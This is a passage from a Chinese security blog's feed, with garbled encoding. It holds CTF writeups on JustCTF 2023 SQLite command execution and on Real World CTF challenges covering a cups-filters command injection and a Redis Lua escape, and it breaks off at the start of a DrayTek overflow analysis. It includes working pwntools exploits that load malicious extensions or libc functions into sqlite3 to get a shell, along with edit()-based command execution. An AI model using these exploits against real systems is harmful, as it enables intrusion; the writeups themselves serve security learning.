p.send(a)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;CREATE TABLE images(name TEXT, type TEXT, img BLOB);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;./exp.so&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dt = f.read()</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;INSERT INTO images(name,type,img)&quot;</span>)</span><br><span class="line"></span><br><span class="line">dt = binascii.hexlify(dt)</span><br><span class="line"><span class="comment"># warning(chr(dt[1]))</span></span><br><span class="line"></span><br><span class="line">print(dt.decode())</span><br><span class="line"><span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">f&quot;VALUES(&#x27;icon&#x27;,&#x27;jpeg&#x27;,cast(x&#x27;<span class="subst">&#123;dt.decode()&#125;</span>&#x27; as text));&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;SELECT writefile(&#x27;./exp.so&#x27;,img) FROM images WHERE name=&#x27;icon&#x27;;&quot;</span>)</span><br><span class="line"><span class="comment"># print(hex(int(p.readline())))</span></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;./exp&#x27;,&#x27;exp&#x27;);&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="learned-from-JustCTF"><a href="#learned-from-JustCTF" class="headerlink" title="learned from JustCTF"></a>learned from JustCTF</h3><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¸èƒ½ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™å¦‚ä½•åˆ©ç”¨ <code>load_extension</code> ï¼Œæ–¹æ³•æ¥åšå‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ</p><h4 id="load-libc-so"><a href="#load-libc-so" class="headerlink" title="load libc.so"></a>load libc.so</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;puts&#39;);</code>  æ¥æ‰§è¡Œä»»æ„çš„ glibc æ–¹æ³•ï¼Œä¾‹å¦‚è¿™é‡Œçš„æ€è·¯æ˜¯</p><p>é€šè¿‡ puts ã€gets  ä¸ºé¢„æµ‹å †åœ°å€ï¼Œå¹¶å†™å…¥æˆ‘ä»¬çš„ç»“æ„ï¼Œç„¶åçˆ†ç ´å †åœ°å€è®©ä»–åœ¨æ‰§è¡Œ system çš„æ—¶å€™,ç¡®ä¿æ˜¯æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚ exploit æ¥è‡ª @n132</p><figure class="highlight python"><figcaption><span>title:"exploit for notabug2(JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./sqlite3&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;0.0.0.0&quot;,13339)</span></span><br><span class="line">p = remote(<span class="string">&#x27;notabug2.nc.jctf.pro&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;puts&#x27;);&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">lic = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">warning(hex(lic))</span><br><span class="line">pie_base = lic - <span class="number">0x1589a0</span></span><br><span class="line"></span><br><span class="line">heap = <span class="number">0x00005555556b0000</span><span class="number">-0x0000555555554000</span>+pie_base <span class="comment"># 1/0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_plt = (pie_base+0x2228C)</span></span><br><span class="line">system_plt = pie_base + <span class="number">0x10910</span></span><br><span class="line"><span class="keyword">if</span> pie_base &gt; <span class="number">0x600000000000</span>:</span><br><span class="line">    p.close()</span><br><span class="line">warning(hex(pie_base)) <span class="comment">#lic+0x28b8</span></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;gets&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(p64(heap+<span class="number">0x11eb0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pie_base+<span class="number">0x000000000009e0ad</span>))</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">dt = <span class="string">b&quot;/bin/sh\0&quot;</span>+flat([<span class="number">0</span>]*<span class="number">8</span>)+ flat([<span class="number">0</span>]*<span class="number">8</span>)+ p64(system_plt)</span><br><span class="line">sla(<span class="string">b&quot;lite&gt; &quot;</span>,<span class="string">f&quot;select cast(x&#x27;<span class="subst">&#123;dt.hex()&#125;</span>&#x27; as text), &quot;</span>.encode()+<span class="string">b&quot;Load_extension(&#x27;&quot;</span>+p64(system_plt)[:<span class="number">6</span>]+<span class="string">b&quot;&#x27;,&#x27;/bin/sh&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;echo n132&quot;</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">data = p.read(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;n132&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">    p.sendline(<span class="string">&quot;/jailed/readflag&quot;</span>)</span><br><span class="line">    input()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><h4 id="system-execute-command"><a href="#system-execute-command" class="headerlink" title=".system execute command"></a>.system execute command</h4><p>åœ¨ <code>Command Line Shell For SQLite</code> ç•Œé¢ä¸­ï¼Œ sqlite æ˜¯å†…ç½®äº†ä¸€äº›æ–¹æ³•çš„ <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">^3</a>  ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº† <code>.system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system CMD ARGSâ€¦Run CMD ARGSâ€¦ in a system shell</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œä½†æ˜¯åœ¨ JustCTF ä¸­ï¼Œ ç¨‹åºåšäº†é™åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ pwnable in /tmp/private [14:10:59]</span></span><br><span class="line">$ cat run-sqlite.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sed -ue <span class="string">&#x27;/^\./ &#123; /^\.open/!d; &#125;&#x27;</span> | /jailed/sqlite3 -interactive<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™çš„è§£é‡Šå°±æ˜¯:</p><p>è¿™ä¸ªsedè„šæœ¬çš„ä½œç”¨æ˜¯ä»è¾“å…¥ä¸­ç­›é€‰å‡ºç‰¹å®šçš„è¡Œã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚è§£é‡Šä¸€ä¸‹è„šæœ¬çš„å«ä¹‰ï¼š</p><p>/^./ï¼šåŒ¹é…ä»¥.å¼€å¤´çš„è¡Œã€‚<br>{ /^.open/!d; }ï¼šå¯¹äºåŒ¹é…åˆ°çš„ä»¥.å¼€å¤´çš„è¡Œï¼Œå¦‚æœè¡Œä¸ä»¥.openå¼€å¤´ï¼Œåˆ™åˆ é™¤ï¼ˆdï¼‰è¯¥è¡Œã€‚<br>å› æ­¤ï¼Œè¿™ä¸ªsedå‘½ä»¤çš„ä½œç”¨æ˜¯åˆ é™¤ä»¥.å¼€å¤´ä½†ä¸ä»¥.openå¼€å¤´çš„è¡Œã€‚</p><p>å› æ­¤é€šå¸¸è€Œè¨€æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œ <code>.system</code> å‘½ä»¤çš„ï¼Œä½†æ˜¯å¦‚æœå’Œ <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;getchar&#39;);</code> é…åˆå°±å¯ä»¥äº†ï¼Œ è¿™æ˜¯ @crazyman èµ›åå‘ç°çš„ã€‚ å¤§æ¦‚æ˜¯æ­£åˆ™å¤šè¡ŒåŒ¹é…çš„é—®é¢˜äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31&#39;, &#39;getchar&#39;);</span><br><span class="line"> .system &#x2F;jailed&#x2F;readflag</span><br><span class="line">Runtime error: error during initialization: </span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h4 id="sqlite3-edit-function-execute-command"><a href="#sqlite3-edit-function-execute-command" class="headerlink" title="sqlite3 edit function execute command"></a>sqlite3 edit function execute command</h4><p>åœ¨ sqlite è¿˜æœ‰ä¸€ä¸ªåå« <code>Edit()</code> çš„å‡½æ•° <a href="https://www.sqlite.org/cli.html">^4</a>ï¼Œ è¯¥ <code>Edit()</code> æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå€¼â€”â€”é€šå¸¸æ˜¯ä¸€ä¸ªè¦ç¼–è¾‘çš„å¤§çš„å¤šè¡Œå­—ç¬¦ä¸²ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯¹æ–‡æœ¬ç¼–è¾‘å™¨çš„è°ƒç”¨ã€‚ä»”ç»†é˜…è¯»ä»£ç ï¼Œè¯¥æ–¹æ³•å…¶å®ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3_create_function(p-&gt;db, <span class="string">&quot;edit&quot;</span>, <span class="number">2</span>, SQLITE_UTF8, <span class="number">0</span>,</span><br><span class="line">                            editFunc, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨åˆ° <code>editFunc</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zCmd = sqlite3_mprintf(<span class="string">&quot;%s \&quot;%s\&quot;&quot;</span>, zEditor, zTempFile);</span><br><span class="line"><span class="keyword">if</span>( zCmd==<span class="number">0</span> )&#123;</span><br><span class="line">  sqlite3_result_error_nomem(context);</span><br><span class="line">  <span class="keyword">goto</span> edit_func_end;</span><br><span class="line">&#125;</span><br><span class="line">rc = system(zCmd);</span><br><span class="line">sqlite3_free(zCmd);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åœ¨ discord çœ‹åˆ°å¦å¤–ä¸€ä¸ªé˜Ÿçš„PoCï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite&gt; .open :memory:</span><br><span class="line">sqlite&gt; CREATE TABLE t(a INT, b VARCHAR(200));</span><br><span class="line">sqlite&gt; insert into t values (0, &#39;&#39;);</span><br><span class="line">sqlite&gt; update t set b&#x3D;edit(&#39;&#39;,&#39;&#x2F;jailed&#x2F;readflag&#39;) where a&#x3D;0;</span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>1 <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">Many-Birds-One-Stone</a><br>2 <a href="https://www.sqlite.org/c3ref/load_extension.html">load_extension</a><br>3 <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">SQLite3å‘½ä»¤è¡Œçª—å£å¸¸ç”¨å‘½ä»¤</a><br>4 <a href="https://www.sqlite.org/cli.html">The edit() SQL function</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="JustCTF" scheme="https://bestwing.me/tags/JustCTF/"/>
    
    <category term="sqlite" scheme="https://bestwing.me/tags/sqlite/"/>
    
  </entry>
  
  <entry>
    <title>Real World CTF 5th writeup</title>
    <link href="https://bestwing.me/RWCTF-5th-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-5th-Writeup.html</id>
    <published>2023-05-16T16:00:00.000Z</published>
    <updated>2023-05-25T11:58:13.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>è¿™æ¬¡ RWCTF æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†ä¸¤ä¸ªé¢˜: ã€ŒPrinter2ã€ å’Œ ã€ŒHardened Redisã€ã€‚è‡³äºä¸ºä»€ä¹ˆä»Šå¤©æ‰åœ¨åšå®¢æ›´æ–°è¿™ä¸ªWriteupä¸€ä¸ªåŸå› å°±æ˜¯ Pritner2 ç›¸å…³çš„æ¼æ´ä»Šå¤©ç»ˆäºå‘å¸ƒäº†æ­£å¼è¡¥ä¸ã€‚</p><h2 id="Printer2"><a href="#Printer2" class="headerlink" title="Printer2"></a>Printer2</h2><p>è¿™æ˜¯ <code>OpenPrinting</code> é¡¹ç›®ä¸­ <code>cups-filters</code> æ¨¡å—ä¸‹çš„ Backend Error Handlerï¼ˆç®€ç§° behï¼‰å­˜åœ¨çš„æ¼æ´ã€‚è¿™é‡Œæ˜¯å…³äº <a href="https://wiki.linuxfoundation.org/openprinting/database/backenderrorhandler">beh</a> çš„ä»‹ç»</p><p>æ¼æ´ç‚¹ä½äº <a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// (context: argv = beh &lt;job-id&gt; &lt;user&gt; &lt;title&gt; &lt;copies&gt; &lt;options&gt; [file])</span></span><br><span class="line">  <span class="built_in">snprintf</span>(cmdline, <span class="keyword">sizeof</span>(cmdline),</span><br><span class="line">  <span class="string">&quot;%s/backend/%s &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; %s&quot;</span>,</span><br><span class="line">  cups_serverbin, scheme, argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>],</span><br><span class="line">        ...</span><br><span class="line">  (argc == <span class="number">6</span> ? <span class="string">&quot;1&quot;</span> : argv[<span class="number">4</span>]),</span><br><span class="line">  argv[<span class="number">5</span>], filename);</span><br><span class="line">        ...</span><br><span class="line">retval = system(cmdline) &gt;&gt; <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ï¼Œ å½“ç”¨æˆ·æ§åˆ¶ user æˆ–è€… title å­—æ®µçš„æ—¶å€™å¯ä»¥é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ›´è¯¦ç»†çš„ç»†èŠ‚å¯ä»¥çœ‹æˆ‘æäº¤ç»™å®˜æ–¹çš„æŠ¥å‘Šï¼š</p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters </a></p><h2 id="Hardened-Redis"><a href="#Hardened-Redis" class="headerlink" title="Hardened Redis"></a>Hardened Redis</h2><p>è¿™æ˜¯é¢˜ç›®è€ƒç‚¹æ˜¯åœ¨è¾ƒé«˜ç‰ˆæœ¬çš„æƒ…å†µä¸‹åœ¨æœ‰è®¿é—® <code>Redis</code> çš„æƒ…å†µä¸‹å¦‚ä½•è·å–  <code>Redis</code> æ‰€åœ¨ç³»ç»Ÿ shell æƒé™ã€‚ åœ¨é«˜ç‰ˆæœ¬çš„ Redis å·²ç»ä¸èƒ½ä½¿ç”¨ä¸»ä»å¤åˆ¶æ¥è·å– shelläº†ï¼ˆå°è±¡ä¸­ï¼‰ï¼Œå¦å¤–æˆ‘ä¹Ÿç¦ç”¨äº†ä¸€äº› <code>Redis</code> çš„æ–¹æ³•ã€‚ ä½†æ˜¯ç”±äºå¯¹ Redis çš„ç†ŸçŸ¥ç¨‹åº¦ä¸å¤Ÿï¼Œ å…¶æ¬¡ä¹Ÿæ˜¯å»å¹´å‚åŠ  CTF å°‘äº†ï¼Œ è¢« <a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a> çš„ä¸€ä¸ª <code>Redis</code> é¢˜çš„è§£æ³•éé¢„æœŸäº†ã€‚</p><p>ä¸‹æ¬¡æœ‰æœºä¼šå¯ä»¥å’Œå¤§å®¶è¯¦ç»†åˆ†äº«ä¸‹è¿™ä¸ªè§£æ³•ã€‚</p><p>è¿™é‡Œæ¥ç€è®²æˆ‘çš„é¢„æœŸè§£æ³•ï¼Œè®²åˆ° <code>Redis</code> ï¼Œ å¦‚æœå¤§å®¶æœ‰å°è±¡ï¼Œåº”è¯¥ä¼šæƒ³åˆ° <code>CVE-2022-0543</code> ã€‚ å½“æ—¶è¿™ä¸ªæ¼æ´å½±å“äº† Debian ç³»åˆ—çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿçš„åŒ…ç®¡ç†å™¨æ‰€å®‰è£…çš„ <code>Redis</code> ã€‚å› ä¸º Debian ç³»åˆ—ç”±äºæ‰“åŒ…é—®é¢˜ï¼ŒRedisåœ¨Luaè§£æå™¨åˆå§‹åŒ–åï¼Œpackageå˜é‡æ²¡æœ‰è¢«æ­£ç¡®æ¸…é™¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡ŒLuaæ²™ç®±é€ƒé€¸ï¼Œä»è€Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ³¨æ„åˆ°äº†è¿™ Debian ç³»åˆ—ç”¨çš„ <code>Redis</code> ï¼ˆå³ä½¿ç”¨ apt å®‰è£… ) æ‰€ä½¿ç”¨çš„ lua è§£æå™¨æ˜¯ lua 5.1 ï¼Œ è€Œä¸”æ˜¯å­˜åœ¨ä¸€ä¸ª 2015 å¹´æ¼æ´çš„ lua è§£æå™¨ï¼Œè™½ç„¶è¿™ä¸ªæ¼æ´åœ¨ 2015 å¹´å°±è¢« <a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a"><code>Redis</code>å®˜æ–¹ä¿®å¤äº†</a>ï¼Œ ä½†æ˜¯ lua 5.1 è§£æå™¨å¹¶æ²¡æœ‰ä¿®å¤ã€‚</p><p><code>apt</code> å‘½ä»¤å®‰è£…çš„redisä½¿ç”¨çš„æ˜¯å•ç‹¬çš„ liblua5.1.so.0</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" title="image-20230524155200264" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" alt="image-20230524155200264"></a></p><p>2015 å¹´è¿™ä¸ªæ¼æ´æ˜¯ <code>CVE-2015-4335</code>ï¼Œ å¦å¤– HN è¯„è®ºåŒºå½“æ—¶ä¹Ÿæåˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png"></a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still â€˜brokenâ€™ because Redis have applied custom patches to the )</a></p><p>è™½ç„¶å½“æ—¶æˆ‘ä¹Ÿç»™  ubuntu å’Œ Debian å‘äº†é‚®ä»¶æé†’äº†è¿™ä»¶äº‹ï¼Œä½†æ˜¯ä»–ä»¬çš„å›å¤çœ‹èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆæƒ³å•ç‹¬ä¿®å¤ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" title="image-20230518002900794" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" alt="image-20230518002900794"></a></p><p>è¿›ä¸€æ­¥çš„æ¼æ´åˆ©ç”¨ä¸åˆ†æå¯ä»¥å‚è€ƒæˆ‘ chu å¸ˆçˆ¶ çš„åšå®¢ï¼Œ <a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335åˆ†æ </a>ï¼Œ æˆ‘å°±ä¸èµ˜è¿°äº†ã€‚ æ²¡æƒ³åˆ°éš”äº†è¿™ä¹ˆä¹…è¿˜æ˜¯ä¾ç„¶èƒ½å—åˆ° chu å¸ˆçˆ¶çš„ç…§é¡¾ã€‚</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters</a></p><p><a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still â€˜brokenâ€™ because Redis have applied custom patches to the â€¦ | Hacker News (ycombinator.com)</a></p><p><a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a">disable loading lua bytecode</a></p><p><a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335åˆ†æ </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2023-24805" scheme="https://bestwing.me/tags/CVE-2023-24805/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-32548 DrayTeck æ ˆæº¢å‡ºæ¼æ´åˆ†æ</title>
    <link href="https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"/>
    <id>https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html</id>
    <published>2023-04-28T16:00:00.000Z</published>
    <updated>2023-04-29T10:01:47.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘å»å¹´ 9 æœˆä»½å¤ç°çš„ï¼Œä¸€ç›´æ‹–æ›´æ²¡æœ‰å‘å¸ƒåœ¨æˆ‘çš„ Blog ã€‚å› ä¸ºåˆ°è€ƒè™‘ Blog å¤ªä¹…æ²¡æ›´æ–°äº†ï¼Œæ‰€ä»¥è¶ç€å‡æœŸæ•´ç†ä¸‹ç¬”è®°ï¼Œç„¶åå‘è¡¨åœ¨ Blog ä¸Šå§ã€‚é¡ºä¾¿ä¸€æï¼Œ æœ¬ç¯‡æ–‡ç« æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œå¤§ä½¬å¯ä»¥å¿½ç•¥ä¸çœ‹äº†ã€‚</p><p>æˆ‘è¿™é‡Œåˆ†æçš„ç‰ˆæœ¬æ˜¯ Vigor 2912 å‹å· , å›ºä»¶ç‰ˆæœ¬ä¸º 3.8.12 ã€‚å›ºä»¶å¯ä»¥ä»<a href="https://fw.draytek.com.tw/">å®˜ç½‘ä¸‹è½½</a> [^1], ä½†æ˜¯è¿™ä¸ªå±äºDrayOS çš„ç³»ç»Ÿå›ºä»¶æ˜¯éœ€è¦é€†å‘è§£å‹ä»£ç çš„ï¼Œè¿™éƒ¨åˆ†å†…å®¹ä¸åœ¨æœ¬ç¯‡æ–‡ç« çš„è®¨è®ºèŒƒå›´ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒæ¼æ´çš„ä½œè€… slide[^2] ã€‚è¿™é‡Œæˆ‘å°±ä¸å±•å¼€èµ˜è¿°äº†ã€‚</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>è§£å‹å›ºä»¶åï¼Œ æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª RTOS çš„å¤§Binary æ–‡ä»¶, æˆ‘ä»¬å¯ä»¥é€šè¿‡ rbasefind[^3] æˆ–è€…å…¶ä»–æ–¹æ³•è·å–å›ºä»¶çš„åŠ 